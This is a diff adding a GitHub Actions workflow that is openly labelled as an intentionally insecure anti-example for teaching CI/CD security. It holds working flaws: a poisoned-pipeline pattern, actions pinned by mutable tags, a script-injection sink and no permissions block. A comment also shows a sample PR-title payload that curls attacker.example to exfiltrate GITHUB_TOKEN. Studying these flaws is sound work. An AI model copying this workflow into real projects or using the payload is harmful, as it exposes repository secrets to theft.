@@ -1,0 +1,89 @@
+# =============================================================================
+# ANTI-EXAMPLE: INTENTIONALLY INSECURE CI/CD WORKFLOW
+#
+# This file deliberately demonstrates common CI/CD security vulnerabilities
+# for research and educational purposes. It MUST NOT be used in production.
+# Each flaw is annotated with a comment explaining the risk.
+# =============================================================================
+
+name: Insecure CI (Anti-Example – DO NOT USE IN PRODUCTION)
+
+# FLAW 1: Poisoned Pipeline Execution (PPE) via pull_request_target
+#
+# `pull_request_target` runs in the context of the BASE repository, which
+# means it has access to repository secrets. Unlike `pull_request`, it was
+# designed to allow write permissions for workflows that need to label or
+# comment on PRs from forks. However, when combined with a checkout of the
+# *untrusted* pull request code (see FLAW 1b below), this creates a critical
+# vulnerability: an attacker can submit a PR that modifies the build scripts
+# or Makefile, and those modifications execute with secret access. This
+# pattern is the root cause of numerous supply-chain compromises.
+on:
+  pull_request_target:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      # FLAW 1b: Checkout of untrusted PR code in a privileged context
+      #
+      # By checking out `github.event.pull_request.head.sha` – the HEAD of
+      # the contributor's fork – we execute untrusted code. Combined with
+      # `pull_request_target` above (FLAW 1), any script the PR touches
+      # (pom.xml plugins, Maven wrapper, shell scripts) runs with access to
+      # the base repository's secrets. This is the "poisoned pipeline"
+      # injection point. A safe alternative is to only check out the PR code
+      # *after* a human reviewer has approved and the code is trusted, or to
+      # use `pull_request` without access to secrets.
+      - name: Checkout untrusted PR code (UNSAFE in pull_request_target)
+        # FLAW 2: Action referenced by mutable tag, not pinned commit SHA
+        #
+        # Using `actions/checkout@v4` means the workflow resolves whichever
+        # commit the `v4` tag currently points to. A compromised action
+        # maintainer or a tag-hijacking attack could silently redirect the
+        # tag to malicious code. Pinning to a full commit SHA (e.g.
+        # actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683)
+        # guarantees the exact, auditable version is used every time.
+        uses: actions/checkout@v4   # FLAW 2: mutable tag
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # FLAW 1b: untrusted ref
+
+      # FLAW 2 (continued): setup-java also pinned by mutable tag
+      - name: Set up Java 17
+        uses: actions/setup-java@v4   # FLAW 2: mutable tag
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      # FLAW 3: Script injection via unsanitised expression in a run step
+      #
+      # `github.event.pull_request.title` is data supplied by an external
+      # actor (the PR author). Interpolating it directly into a shell command
+      # with `${{ ... }}` means GitHub Actions expands it *before* the shell
+      # sees the string. An attacker can craft a PR title such as:
+      #
+      #   "; curl https://attacker.example/exfil?token=$GITHUB_TOKEN; echo "
+      #
+      # and the resulting shell command becomes:
+      #
+      #   echo "PR: ; curl https://attacker.example/exfil?token=<real token>; echo ""
+      #
+      # which executes the injected command. The `echo` here is a harmless
+      # demonstration payload; in a real attack the injected code would
+      # exfiltrate secrets. The safe fix is to assign the value to an
+      # environment variable first (see secure.yml).
+      - name: Log PR title (script injection sink)
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+
+      # FLAW 4 (implicit): No `permissions` block
+      #
+      # When no `permissions` key is present, the workflow inherits the
+      # repository's default token permissions. For many repositories this
+      # means `GITHUB_TOKEN` has write access to contents, pull requests,
+      # packages, and more. The principle of least privilege requires
+      # explicitly declaring only the permissions each job actually needs.
+      - name: Build and test with Maven
+        run: mvn -B package --no-transfer-progress
